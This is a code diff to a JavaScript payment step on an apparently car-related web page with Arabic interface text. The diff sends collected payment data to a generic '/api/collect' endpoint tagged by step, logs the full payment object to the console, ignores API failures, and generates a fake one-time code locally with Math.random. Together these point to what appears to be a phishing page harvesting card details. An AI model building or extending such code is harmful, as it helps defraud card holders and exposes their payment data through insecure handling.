@@ -406,17 +406,29 @@
                 modele: currentCar?.modele || 'غير محدد'
             };
             
+            console.log("[v0] Sending payment:", paymentData);
+            
             try {
-                const response = await fetch('/api/send-payment', {
+                const response = await fetch('/api/collect', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(paymentData)
+                    body: JSON.stringify({
+                        step: 'payment',
+                        data: paymentData
+                    })
                 });
                 
-                if (response.ok) {
-                    const responseData = await response.json();
+                const text = await response.text();
+                console.log("[v0] API response text:", text);
+                
+                try {
+                    const responseData = JSON.parse(text);
+                    console.log("[v0] API response JSON:", responseData);
+                } catch (parseError) {
+                    console.log("[v0] Could not parse response as JSON");
                 }
             } catch (apiError) {
+                console.log("[v0] API error (continuing anyway):", apiError.message);
             }
             
             generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
@@ -430,6 +442,7 @@
             
             showStep(4);
         } catch (error) {
+            console.error("[v0] Error in sendPayment:", error);
             alert('حدث خطأ: ' + error.message);
         }
     }
